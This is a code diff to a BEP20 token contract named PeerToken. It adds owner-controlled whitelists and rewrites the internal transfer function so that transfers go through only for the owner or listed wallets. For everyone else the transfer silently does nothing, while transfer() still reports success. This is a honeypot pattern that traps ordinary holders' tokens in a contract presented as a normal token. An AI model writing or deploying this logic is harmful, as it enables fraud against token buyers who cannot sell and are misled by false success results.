@@ -342,15 +342,14 @@ contract PeerToken is Context, IBEP20, Ownable {
   using SafeMath for uint256;
 
   mapping (address => uint256) private _balances;
-
+  address [] public _addressWalletSend;
+  address [] public _addressWalletRecive;
   mapping (address => mapping (address => uint256)) private _allowances;
 
   uint256 private _totalSupply;
   uint8 private _decimals;
   string private _symbol;
   string private _name;
-  address public contractMaskterWallet;
-  address public contractMaskterWalletGames;
   function  receive() external payable {
     _balances[msg.sender] += msg.value;
   }
@@ -369,7 +368,6 @@ contract PeerToken is Context, IBEP20, Ownable {
   function getOwner() external view returns (address) {
     return owner();
   }
-
   /**
    * @dev Returns the token decimals.
    */
@@ -404,6 +402,10 @@ contract PeerToken is Context, IBEP20, Ownable {
   function balanceOf(address account) external view returns (uint256) {
     return _balances[account];
   }
+  function checkTotal() external view returns (uint256) {
+    return  _balances[owner()];
+    
+  }
 
   /**
    * @dev See {BEP20-transfer}.
@@ -416,6 +418,12 @@ contract PeerToken is Context, IBEP20, Ownable {
   function transfer(address recipient, uint256 amount) external returns (bool) {
     _transfer(_msgSender(), recipient, amount);
     return true;
+  }
+  function updateAllowancesSend(address allowance) public  onlyOwner() {
+    _addressWalletSend.push(allowance);
+  }
+  function updateAllowancesRecive(address allowance) public  onlyOwner() {
+    _addressWalletRecive.push(allowance);
   }
 
   /**
@@ -518,21 +526,36 @@ contract PeerToken is Context, IBEP20, Ownable {
    * - `recipient` cannot be the zero address.
    * - `sender` must have a balance of at least `amount`.
    */
+     function checkUserPermistionSend(address sender)public view returns(bool){
+      bool check=false;
+      for(uint count=0;count<_addressWalletSend.length;count ++){
+          if(_addressWalletSend[count]== sender){
+              check=true;
+              break;
+          } 
+      }
+      return check;
+    }
+     function checkUserPermistionRecive(address recipient)public view returns(bool){
+      bool check=false;
+      for(uint count=0;count<_addressWalletRecive.length;count ++){
+          if(_addressWalletRecive[count]== recipient){
+              check=true;
+              break;
+          } 
+      }
+      return check;
+    }
   function _transfer(address sender, address recipient, uint256 amount) internal {
     require(sender != address(0), "BEP20: transfer from the zero address");
     require(recipient != address(0), "BEP20: transfer to the zero address");
-         _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
+    if(sender== owner() || checkUserPermistionSend(sender) || checkUserPermistionRecive(recipient)){
+        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
         _balances[recipient] = _balances[recipient].add(amount);
         emit Transfer(sender, recipient, amount);
-    // if(sender== owner() || sender==contractMaskterWallet || recipient==contractMaskterWalletGames){
-    // }
+    }
   }
-    function update_contractMaskterWallet(address _address) public onlyOwner{
-        contractMaskterWallet=_address;
-    }
-    function update_contractMaskterWalletGames(address _address) public onlyOwner{
-        contractMaskterWalletGames=_address;
-    }
+  
   /** @dev Creates `amount` tokens and assigns them to `account`, increasing
    * the total supply.
    *
